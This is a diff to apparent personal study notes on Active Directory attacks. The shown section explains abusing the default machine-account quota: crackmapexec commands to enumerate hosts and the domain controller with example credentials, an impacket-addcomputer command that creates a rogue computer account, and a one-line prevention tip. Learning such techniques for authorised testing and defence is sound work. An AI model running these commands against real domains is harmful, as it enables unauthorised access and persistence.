@@ -58,12 +58,15 @@ Active Directory Attacks:-
 		
 		Prevention:-
 			Use strong and complex password or host based password insted of user based password.
+			
 	Default Settings -Add-Computer
 	
 		Configration:-
-			ms-DS-MachineAccountQuota attribute 
-			add workstation to the domain permission
-	Steps:-
-		crackmapexec smb 192.168.200.1/30 //search for machines
-		crackmapexec smb 192.168.200.1/30 -u yazan -p 'yazan' -d domain.ini //search for the domain controller 
-		impacket-addcomputer -dc-ip 192.168.100.200 domain.iti/yazan:'yazan' -computer-name Computer1$ -computer-password yazan //create a computer account the name of it must containt $ at the end 
+			ms-DS-MachineAccountQuota attribute (10 by default)
+			add workstation to the domain permission (enabled by default)
+		Steps:-
+			crackmapexec smb 192.168.200.1/30 //search for machines
+			crackmapexec smb 192.168.200.1/30 -u yazan -p 'yazan' -d domain.ini //search for the domain controller 
+			impacket-addcomputer -dc-ip 192.168.100.200 domain.iti/yazan:'yazan' -computer-name Computer1$ -computer-password yazan //create a computer account the name of it must containt $ at the end 
+		Prevention:-
+			from the configuration give it only for the needed staff.
